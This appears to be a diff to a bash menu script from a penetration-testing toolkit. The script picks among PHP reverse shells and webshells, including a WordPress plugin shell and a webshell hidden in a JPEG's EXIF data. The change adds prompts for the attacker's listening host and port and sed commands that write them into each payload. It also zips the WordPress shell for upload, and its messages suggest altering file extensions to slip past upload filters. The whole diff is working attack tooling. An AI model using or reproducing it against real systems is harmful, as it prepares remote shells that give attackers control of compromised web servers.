@@ -20,14 +20,14 @@ echo -e ""
 echo -e "${BLUE}"
 echo -e "Which shell would you like?"
 echo -e "1 = reverse-php-shell (evil.php)"
-echo -e "1a = Tiny php revshell (tiny.php)"
-echo -e "1b = New php revshell (new.php)"
-echo -e "2 = jpg header revshell (evil.jpg)"
-echo -e "3 = simple-web-shell (shell.php)"
-echo -e "4 = Wwolf-php-webshell (wolfwebshell.php)"
-echo -e "5 = List of webshells to try"
-echo -e "6 = Wordpress Plugin revshell (wp-evil.php)"
-echo -e "7 = Jpeg with Exif impregnated webshell (sh1n.php5.jpg)"
+echo -e "2 = Tiny php revshell (tiny.php)"
+echo -e "3 = New php revshell (new.php)"
+echo -e "4 = jpg header revshell (evil.jpg)"
+echo -e "5 = simple-web-shell (shell.php)"
+echo -e "6 = Wwolf-php-webshell (wolfwebshell.php)"
+echo -e "7 = List of webshells to try"
+echo -e "8 = Wordpress Plugin revshell (wp-evil.php)"
+echo -e "9 = Jpeg with Exif impregnated webshell (sh1n.php5.jpg)"
 echo -e "${NC}"
 echo -e ""
 
@@ -45,20 +45,22 @@ fi
 
 case $shelltype in
 	1)
+        read -p "Enter lhost: " new_ip
+        read -p "Enter lport: " new_port
+        cat ~/shells/evil.php |sed -r 's/(\b[0-9]{1,3}\.){3}[0-9]{1,3}\b'/"$new_ip"/  |sed -r 's|^(\$port\s*=\s*).*|\$port = '$new_port'|' > evil.php
 	echo -e "Copying evil.php to your pwd..."
-	echo -e "Just remember to amend lhost and lport!"
 	echo -e "${YELLOW}For a .gif file prepend GIF89 to the file${NC}"
-	cp ~/shells/evil.php .
 	;;
 
-	1a)
+	2)
+        read -p "Enter lhost: " new_ip
+        read -p "Enter lport: " new_port
+        cat ~/shells/tiny.php |sed -r -e 's/(\b[0-9]{1,3}\.){3}[0-9]{1,3}\b'/"$new_ip"/ |sed -e 's/443/'"$new_port"'/g' > tiny.php
 	echo -e "Copying tiny.php to your pwd..."
-	echo -e "Just remember to amend lhost and lport!"
-	cp ~/shells/tiny.php .
 	;;
 
 
-	1b)
+	3)
 	echo -e "Copying new.php to your pwd..."
 	echo -e "https://github.com/ivan-sincek/php-reverse-shell.git"
 	echo -e "This repo is cloned in /opt folder, and worth checking out!"
@@ -66,39 +68,43 @@ case $shelltype in
 	;;
 
 
-	2)
-	echo -e "Copying evil.jpg to your pwd..."
+	4)
+	read -p "Enter lhost: " new_ip
+        read -p "Enter lport: " new_port
+        cat ~/shells/evil.jpg |sed -r 's/(\b[0-9]{1,3}\.){3}[0-9]{1,3}\b'/"$new_ip"/  |sed -r 's|^(\$port\s*=\s*).*|\$port = '$new_port'|' > evil.jpg
+        echo -e "Copying evil.jpg to your pwd..."
 	echo -e "You may need to play with file extensions to bypass filters"
-	cp ~/shells/evil.jpg .
 	;;
 
 
-	3)
+	5)
 	echo -e "Copying shell.php to your pwd..."
 	cp ~/shells/shell.php .
 	;;
 
-	4)
+	6)
 	echo -e "Copying wolfwebshell.php to your pwd..."
 	cp ~/shells/wolfwebshell.php .
 	;;
 
 
-	5)
+	7)
 	echo -e "${YELLOW}If the webshell is not working, try one of these...${NC}"
 	cat ~/shells/php-shell-injection.txt
 	;;
 
 
-	6)
+	8)
+        read -p "Enter lhost: " new_ip
+        read -p "Enter lport: " new_port
+        cat ~/shells/wp-evil.php |sed -r 's/(\b[0-9]{1,3}\.){3}[0-9]{1,3}\b'/"$new_ip"/  |sed -r 's|^(\$port\s*=\s*).*|\$port = '$new_port'|' > wp-evil.php
 	echo -e "Copying wp-evil.php to your pwd..."
-	echo -e "Just amend lhost and lport, then zip it up and upload it!"
 	echo -e "${BLUE}7z a wp-evil.zip wp-evil.php${NC}"
-	cp ~/shells/wp-evil.php .
+        7z a wp-evil.zip wp-evil.php
 	;;
 
 
-	7)
+	9)
 	echo -e "Copying sh1n.php5.jpg to your pwd..."
 	echo -e "You may need to play with file extensions to bypass filters."
 	echo -e "${YELLOW}example: Inject a .jpg file with a webshell...${NC}"
